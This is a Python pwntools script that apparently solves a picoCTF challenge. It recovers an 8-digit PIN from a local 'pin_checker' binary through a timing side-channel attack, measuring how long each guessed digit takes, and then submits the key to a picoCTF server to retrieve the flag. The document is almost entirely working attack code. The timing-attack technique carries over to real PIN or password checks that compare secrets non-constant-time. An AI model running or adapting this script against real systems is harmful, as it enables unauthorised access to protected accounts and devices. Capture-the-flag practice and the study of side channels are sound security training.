from pwn import *
from time import time

def check_digit(times):
    correct_digit = 0
    max = 0
    for digit, time in enumerate(times):
        if time > max:
            correct_digit = digit
            max = time
    return str(correct_digit)

def pad(key):
    return key + (8 - len(key)) * "0"

@context.quietfunc
def timing_attack():
    print("[+] Beginning timing attack. To improve timing accuracy, close background processes and remain on this window.")
    key = ""
    for i in range(8):
        times = []
        for j in range(10):     
            p = process("./pin_checker")          
            p.sendline(pad(key + str(j)).encode())
            start_time = time()
            p.recvall()
            end_time = time()          
            times.append(end_time - start_time)
            p.close()
        key += check_digit(times)
        print(f"[+] {i + 1} digits found: {key}")
    return key

@context.quietfunc
def verify_key(key):
    p = process("./pin_checker")
    p.sendline(key.encode())
    result = p.recvall()
    if b"Access granted" in result:
        print("[+] Key verified! Sending to master server...")
        r = remote("saturn.picoctf.net", "50364")
        r.sendline(key.encode())
        result = str(r.recvall())
        r.close()
        FLAG = result[result.index("picoCTF"):result.index("}") + 1]
        print("[+] Flag:", FLAG)
        return True
    else:
        print("[!] Attack failed. Wrong key found.")
        print("[-] Trying again...")
        return False

if __name__ == "__main__":
    found = False
    while not found:
        key = timing_attack()
        print("[+] Key found:", key)
        found = verify_key(key)
    

